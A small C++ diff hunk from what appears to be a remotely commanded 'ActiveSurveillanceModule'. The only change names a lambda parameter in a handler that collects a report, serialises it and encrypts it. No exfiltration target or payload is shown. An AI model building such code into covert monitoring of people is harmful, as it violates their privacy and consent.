@@ -114,7 +114,7 @@ std::string ActiveSurveillanceModule::encrypt_report(const std::string& js){
 }
 
 void ActiveSurveillanceModule::init(){
-    register_command("SURVEILLANCE", [this](const nlohmann::json&){
+    register_command("SURVEILLANCE", [this](const nlohmann::json& cmd){
         auto rep=collect();
         std::string j=rep.dump();
         std::string enc=encrypt_report(j);
